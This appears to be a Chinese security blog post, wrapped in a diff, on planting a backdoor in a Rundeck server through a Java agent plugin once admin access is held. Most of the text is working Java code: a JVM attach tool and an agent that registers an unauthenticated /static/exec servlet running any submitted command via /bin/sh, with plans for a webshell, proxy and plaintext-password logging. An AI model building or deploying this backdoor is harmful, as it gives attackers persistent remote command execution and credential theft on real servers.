@@ -1,0 +1,479 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>Rundeck 实战：Java Agent 插件后门植入全流程 | B1ackOw1&#39;s Blog</title>
+  <meta name="author" content="BlackOwl">
+  
+  <meta name="description" content="主要讲述拥有rundeck管理员权限编写并安装rundeck的JAVA插件后门以及Demo"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="Rundeck 实战：Java Agent 插件后门植入全流程"/>
+  <meta property="og:site_name" content="B1ackOw1&#39;s Blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="B1ackOw1&#39;s Blog" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/dark-theme.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">B1ackOw1&#39;s Blog</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class=""></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class=""></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class=""></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class=""></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> Rundeck 实战：Java Agent 插件后门植入全流程</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <p>主要讲述拥有rundeck管理员权限编写并安装rundeck的JAVA插件后门以及Demo</p>
+<span id="more"></span>
+<hr>
+<h2 id="Begin"><a href="#Begin" class="headerlink" title="Begin"></a>Begin</h2><p>最近碰到一个<strong>rundeck</strong>的环境，拥有管理员权限，只开放了4430端口，由于rundeck是通过<code>java -jar</code> 启动的，常规的写文件并没有用处，于是想到通过自编插件的方式用<code>java agent</code>劫持路由的方式来注入webshell以及其他的功能。本文章代码同步在Github上<a target="_blank" rel="noopener" href="https://github.com/b1ackow1/Rundeck-backdoor-plugin">Rundeck-backdoor-plugin</a></p>
+<h2 id="Principle"><a href="#Principle" class="headerlink" title="Principle"></a>Principle</h2><h3 id="使用Java-agent注入测试，看是否能劫持到路由"><a href="#使用Java-agent注入测试，看是否能劫持到路由" class="headerlink" title="使用Java agent注入测试，看是否能劫持到路由"></a>使用Java agent注入测试，看是否能劫持到路由</h3><p>根据观察，发现rundeck的插件功能和rundeck服务功能执行的用户权限都是rundeck用户权限，这就具备了前置注入条件了，省的权限不一导致我们的<code>java agent</code>没有权限读到rundeck web服务的<code>JVM</code>从而导致注入失败！</p>
+<h4 id="劫持哪个路由？需要做什么功能？"><a href="#劫持哪个路由？需要做什么功能？" class="headerlink" title="劫持哪个路由？需要做什么功能？"></a>劫持哪个路由？需要做什么功能？</h4><p>Rundeck 是一个基于 Java 开发的运维自动化与作业调度平台，采用 Grails 框架（基于 Groovy 和 Spring）构建 Web 层，并运行在内嵌的 Jetty 容器中。<br>所以不同于tomcat,我们要对<code>Grails</code>进行注入并且劫持路由。从功能完整性来看，我们需要找到不用认证就能访问的路由。从Rundeck的代码可以看到，不需要经过认证的路由如下<a target="_blank" rel="noopener" href="https://github.com/rundeck/rundeck/blob/fa377be10b6e2b1cd4b6595664355f5d9433eaab/rundeckapp/grails-app/conf/application.groovy#L114">路由配置</a>,由<code>SpringSecurity</code>做的安全访问.</p>
+<img src="/2026/03/08/rundeck-backdoor-for-java/2026-01-31-15-14-52.png" class="">
+
+<p>我们主要关注如下几个无需认证的路由：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/static/**</span><br><span class="line">/feed/**</span><br><span class="line">/assets/**</span><br><span class="line">/user-assets/**</span><br><span class="line">/actuator/**</span><br><span class="line">/actuator/health/**</span><br></pre></td></tr></table></figure>
+<p>劫持这几个路由即可实现无需登录的访问入口，计划实现的功能有三个：哥斯拉&#x2F;冰蝎 <code>WEBSHELL</code>、正向代理（suo5）、劫持登录路由记录明文账号密码，这三项已完全满足实战需求。</p>
+<h3 id="完整功能实现"><a href="#完整功能实现" class="headerlink" title="完整功能实现"></a>完整功能实现</h3><h4 id="1-测试-Java-Agent-注入-JVM"><a href="#1-测试-Java-Agent-注入-JVM" class="headerlink" title="1. 测试 Java Agent 注入 JVM"></a>1. 测试 Java Agent 注入 JVM</h4><p>AttachAgent.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.test.agent;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachine;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AttachAgent</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(args.length&lt;<span class="number">1</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;usage: java -jar agent.jar &lt;PID&gt;&quot;</span>);</span><br><span class="line">            System.exit(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        String pid=args[<span class="number">0</span>];</span><br><span class="line">        String jarPath= <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/tmp/agent.jar&quot;</span>).getAbsolutePath();</span><br><span class="line">        System.out.println(<span class="string">&quot;正在附加到进程&quot;</span>+pid+<span class="string">&quot;...&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">VirtualMachine</span>  <span class="variable">vm</span> <span class="operator">=</span>VirtualMachine.attach(pid);</span><br><span class="line">        vm.loadAgent(jarPath);</span><br><span class="line">        vm.detach();</span><br><span class="line">        System.out.println(<span class="string">&quot;附加成功&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            System.err.println(<span class="string">&quot;附加失败&quot;</span>+e.getMessage());</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>HelloAgent.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.test.agent;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloAgent</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String args,Instrumentation inst)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;==================&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;注入HelloAgent成功 &quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;==================&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<img src="/2026/03/08/rundeck-backdoor-for-java/2026-03-04-11-06-11.png" class="">
+<img src="/2026/03/08/rundeck-backdoor-for-java/2026-03-04-11-07-21.png" class="">
+
+<h4 id="2-使用-Java-Agent-注入-WebShell-Servlet"><a href="#2-使用-Java-Agent-注入-WebShell-Servlet" class="headerlink" title="2. 使用 Java Agent 注入 WebShell Servlet"></a>2. 使用 Java Agent 注入 WebShell Servlet</h4><p>由于<strong>Grails</strong>框架跟spring稍微不一样，获取到<code>ServletContext</code>多了一个步骤，所以需要调试<strong>Grails</strong>框架的代码获取<code>ServletContext</code>，调用链如下:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Holders.getGrailsApplication()   <span class="comment">// → GrailsApplication（Grails 应用核心对象）</span></span><br><span class="line">        .getMainContext()         <span class="comment">// → ApplicationContext（Spring Bean 容器）</span></span><br><span class="line">        .getServletContext()      <span class="comment">// → ServletContext（Servlet 上下文）</span></span><br><span class="line">        .getContextHandler()      <span class="comment">// → ContextHandler（Jetty，最终目标）</span></span><br></pre></td></tr></table></figure>
+<p>拿到<code>ContextHandler</code>之后，手法就跟我们常规的一样了，直接动态代理注册<code>Servlet</code>就好了。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.test.agent;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloAgent</span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String args,Instrumentation inst)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;==================&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;注册路由实现简单WEBSHELL &quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;==================&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">        Thread.sleep(<span class="number">2000</span>);  </span><br><span class="line">         </span><br><span class="line">        <span class="comment">//1. 查找ClassLoader</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">cl</span> <span class="operator">=</span> findWebClassLoader();</span><br><span class="line">        <span class="keyword">if</span> (cl==<span class="literal">null</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;找不到 Classloader&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;找到Classloader&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//2.获取 ServletContext</span></span><br><span class="line">        Object servletContext=getServletContext(cl);</span><br><span class="line">        <span class="keyword">if</span> (servletContext==<span class="literal">null</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;找不到servletcontext&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;找到servletcontext&quot;</span>);</span><br><span class="line">        registerServlet(servletContext, cl);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;http://rundeck:4440/static/exec&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            System.err.println(<span class="string">&quot;错误&quot;</span>+e.getMessage());</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> ClassLoader <span class="title function_">findWebClassLoader</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">           ThreadGroup root= Thread.currentThread().getThreadGroup();</span><br><span class="line">           <span class="keyword">while</span>(root.getParent()!=<span class="literal">null</span>)&#123;</span><br><span class="line">            root=root.getParent();</span><br><span class="line">           &#125;</span><br><span class="line">           </span><br><span class="line">           Thread[] threads=<span class="keyword">new</span> <span class="title class_">Thread</span>[root.activeCount()*<span class="number">2</span>];</span><br><span class="line">           root.enumerate(threads,<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">           <span class="keyword">for</span> (Thread t : threads)&#123;</span><br><span class="line">            <span class="type">ClassLoader</span> <span class="variable">cl</span> <span class="operator">=</span> t.getContextClassLoader();</span><br><span class="line">            <span class="keyword">if</span>(cl!=<span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    cl.loadClass(<span class="string">&quot;javax.servlet.Servlet&quot;</span>);</span><br><span class="line">                    <span class="keyword">return</span> cl;</span><br><span class="line">                &#125;<span class="keyword">catch</span>(ClassNotFoundException e)&#123;&#125;</span><br><span class="line">               </span><br><span class="line">            &#125;</span><br><span class="line">           &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Object <span class="title function_">getServletContext</span><span class="params">(ClassLoader cl)</span>&#123;</span><br><span class="line">        <span class="comment">//rundeck 默认使用的Grails</span></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">        Class&lt;?&gt; holders=cl.loadClass(<span class="string">&quot;grails.util.Holders&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">app</span> <span class="operator">=</span> holders.getMethod(<span class="string">&quot;getGrailsApplication&quot;</span>).invoke(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">ctx</span> <span class="operator">=</span> app.getClass().getMethod(<span class="string">&quot;getMainContext&quot;</span>).invoke(app);</span><br><span class="line">        <span class="keyword">return</span> ctx.getClass().getMethod(<span class="string">&quot;getServletContext&quot;</span>).invoke(ctx);</span><br><span class="line">        </span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;&#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> Object <span class="title function_">getServletHandler</span><span class="params">(Object servletContext)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">      <span class="type">Object</span> <span class="variable">contextHandler</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">          contextHandler = servletContext.getClass()</span><br><span class="line">              .getMethod(<span class="string">&quot;getContextHandler&quot;</span>)</span><br><span class="line">              .invoke(servletContext);</span><br><span class="line">          System.out.println(<span class="string">&quot;获取getContextHandler成功&quot;</span>);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (Exception e1) &#123;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">try</span> &#123;</span><br><span class="line">              contextHandler = servletContext.getClass()</span><br><span class="line">                  .getMethod(<span class="string">&quot;getServletContextHandler&quot;</span>)</span><br><span class="line">                  .invoke(servletContext);</span><br><span class="line">              System.out.println(<span class="string">&quot;获取getServletContextHandler成功&quot;</span>);</span><br><span class="line">          &#125; <span class="keyword">catch</span> (Exception e2) &#123;</span><br><span class="line"></span><br><span class="line">              <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;this$0&quot;</span>);</span><br><span class="line">              f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">              contextHandler = f.get(servletContext);</span><br><span class="line">              System.out.println(<span class="string">&quot;获取this$0 字段成功&quot;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (contextHandler == <span class="literal">null</span>) &#123;</span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>(<span class="string">&quot;无法获取 ContextHandler&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      System.out.println(<span class="string">&quot;[+] ContextHandler: &quot;</span> + contextHandler.getClass().getName());</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 获取 ServletHandler</span></span><br><span class="line">      <span class="type">Object</span> <span class="variable">servletHandler</span> <span class="operator">=</span> contextHandler.getClass()</span><br><span class="line">          .getMethod(<span class="string">&quot;getServletHandler&quot;</span>)</span><br><span class="line">          .invoke(contextHandler);</span><br><span class="line"></span><br><span class="line">      System.out.println(<span class="string">&quot;[+] ServletHandler: &quot;</span> + servletHandler.getClass().getName());</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> servletHandler;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">registerServlet</span><span class="params">(Object servletContext,ClassLoader cl)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">       <span class="comment">//1.获取ServletHandler</span></span><br><span class="line">       Object servletHandler=getServletHandler(servletContext);</span><br><span class="line">       System.out.println(<span class="string">&quot;获取到servetHandler&quot;</span>);</span><br><span class="line">       <span class="comment">//2. 创建动态代理</span></span><br><span class="line">       Class&lt;?&gt; servletClass=cl.loadClass(<span class="string">&quot;javax.servlet.Servlet&quot;</span>);</span><br><span class="line">       Class&lt;?&gt; holderClass= cl.loadClass(<span class="string">&quot;org.eclipse.jetty.servlet.ServletHolder&quot;</span>);</span><br><span class="line">       Class&lt;?&gt; mappingClass= cl.loadClass(<span class="string">&quot;org.eclipse.jetty.servlet.ServletMapping&quot;</span>);</span><br><span class="line">       System.out.println(<span class="string">&quot;加载基础类成功.&quot;</span>);</span><br><span class="line">       <span class="comment">//3. 动态代理</span></span><br><span class="line">       Object servlet=Proxy.newProxyInstance(cl, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;servletClass&#125;, <span class="keyword">new</span> <span class="title class_">InvocationHandler</span>() &#123;</span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy,Method method,Object[] args)</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="string">&quot;service&quot;</span>.equals(method.getName()))&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                 handlerRCE(args[<span class="number">0</span>],args[<span class="number">1</span>]);   </span><br><span class="line">                &#125;<span class="keyword">catch</span>(Exception e)&#123;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">       &#125;);</span><br><span class="line"></span><br><span class="line">       Constructor&lt;?&gt; ctor=holderClass.getConstructor(String.class,servletClass);</span><br><span class="line">       Object hodler=ctor.newInstance(<span class="string">&quot;ExecServlet&quot;</span>,servlet);</span><br><span class="line">       servletHandler.getClass().getMethod(<span class="string">&quot;addServlet&quot;</span>,holderClass).invoke(servletHandler,hodler);</span><br><span class="line">       Object mapping=mappingClass.newInstance();</span><br><span class="line">       mapping.getClass().getMethod(<span class="string">&quot;setServletName&quot;</span>, String.class).invoke(mapping, <span class="string">&quot;ExecServlet&quot;</span>);</span><br><span class="line">       mapping.getClass().getMethod(<span class="string">&quot;setPathSpecs&quot;</span>, String[].class).invoke(mapping, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/static/exec&quot;</span>&#125;&#125;);</span><br><span class="line">       servletHandler.getClass().getMethod(<span class="string">&quot;addServletMapping&quot;</span>, mappingClass).invoke(servletHandler, mapping);</span><br><span class="line">       System.out.println(<span class="string">&quot;成功注册ExecServlet以及路由&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">handlerRCE</span><span class="params">(Object req,Object res)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Method getParam=req.getClass().getMethod(<span class="string">&quot;getParameter&quot;</span>,String.class);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span>(String)getParam.invoke(req, <span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        res.getClass().getMethod(<span class="string">&quot;setContentType&quot;</span>, String.class).invoke(res,<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">w</span> <span class="operator">=</span> res.getClass().getMethod(<span class="string">&quot;getWriter&quot;</span>).invoke(res);</span><br><span class="line">        Method println=w.getClass().getMethod(<span class="string">&quot;println&quot;</span>, String.class);</span><br><span class="line">        <span class="keyword">if</span>(cmd==<span class="literal">null</span>||cmd.isEmpty())&#123;</span><br><span class="line">            println.invoke(w,<span class="string">&quot;&lt;html&gt;&lt;body&gt;cmd:&lt;br/&gt;&lt;form method=&#x27;POST&#x27;&gt;&lt;input name=&#x27;cmd&#x27; size=&#x27;60&#x27; placeholder=&#x27;command&#x27;/&gt;&lt;button&gt;exec&lt;/button&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        println.invoke(w, <span class="string">&quot;&lt;html&gt;&lt;body&gt;Result:&lt;pre&gt;&quot;</span>);</span><br><span class="line">        <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-c&quot;</span>,cmd&#125;);</span><br><span class="line">        java.io.<span class="type">BufferedReader</span> <span class="variable">r</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.BufferedReader(<span class="keyword">new</span> <span class="title class_">java</span>.io.InputStreamReader(p.getInputStream()));</span><br><span class="line">        String line ;</span><br><span class="line">        <span class="keyword">while</span> ((line = r.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">        println.invoke(w, line);</span><br><span class="line">        &#125;</span><br><span class="line">        r= <span class="keyword">new</span> <span class="title class_">java</span>.io.BufferedReader(<span class="keyword">new</span> <span class="title class_">java</span>.io.InputStreamReader(p.getErrorStream()));</span><br><span class="line">        println.invoke(w,<span class="string">&quot;&lt;/pre&gt;&lt;form method=&#x27;POST&#x27;&gt;&lt;input name=&#x27;cmd&#x27; size=&#x27;60&#x27; value=&#x27;&quot;</span>+cmd+<span class="string">&quot;&#x27;/&gt;&lt;button&gt;exec&lt;/button&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<img src="/2026/03/08/rundeck-backdoor-for-java/2026-03-08-13-45-08.png" class="">
